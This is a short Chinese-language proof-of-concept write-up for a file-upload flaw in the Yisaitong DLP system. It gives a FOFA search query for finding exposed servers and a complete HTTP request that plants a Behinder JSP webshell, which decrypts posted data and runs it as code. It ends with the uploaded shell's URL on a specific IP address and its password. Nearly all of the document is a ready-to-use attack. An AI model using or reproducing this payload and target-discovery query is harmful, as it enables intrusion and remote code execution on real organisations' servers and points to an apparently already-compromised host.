# 亿赛通 DLP UploadFileFromClientServiceForClient 文件上传漏洞

    ## fofa

```
(title=="数据泄露防护(DLP)系统" && body="/CDGServer3/index.jsp") || (body="CDGServer3" && body="DLP") || (body="亿赛通数据脱敏系统" && body="mainBtnPanel")
```

CDGServer3/3g/

## poc

```
POST /CDGServer3/UploadFileFromClientServiceForClient?a=CMAMNFHNNEBDPBHMEIHGKDDBFCKMEEEINIHMHLPFPLCFNLDLAHCONNAPDPHMILDIJJNILOBGOOHPNGEKMGEBBLMCFCMMCAOOJEHLJOIHPGELPOGLPDEFACNAKFMHAALBDMAEBGGODDKHMJACJCBDDACPGFLHIEINJCDMPNIDHJKPFGKKCMHNEPLPLPFOCMGGCHCEFFDPFGFCFCDEDJFMCIBEFFGNGN HTTP/1.1
Host: 116.6.193.207:8443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Content-Length: 1410

<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %><%! class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName("java.util.Base64"); Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try { base64 = Class.forName("sun.misc.BASE64Decoder");  Object decoder = base64.newInstance();  value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) {}}return value;}%><% if(request.getMethod().equals("POST")){String k = "e45e329feb5d925b";session.putValue("u", k);Cipher c = Cipher.getInstance("AES");c.init(2, new SecretKeySpec(k.getBytes(), "AES"));StringBuilder sb = new StringBuilder();InputStream inputStream = request.getInputStream();BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));String line;while ((line = reader.readLine()) != null) {sb.append(line);}String data = sb.toString();byte[] bytes = c.doFinal(base64Decode(data));new U(this.getClass().getClassLoader()).g(bytes).newInstance().equals(pageContext);}%>
```

WebShell URL: https://116.6.193.207:8443/A021F84dCcfeBBd3.jsp
Password: rebeyond
WebShell tool: Behinder v3.0
Webshell type: jsp
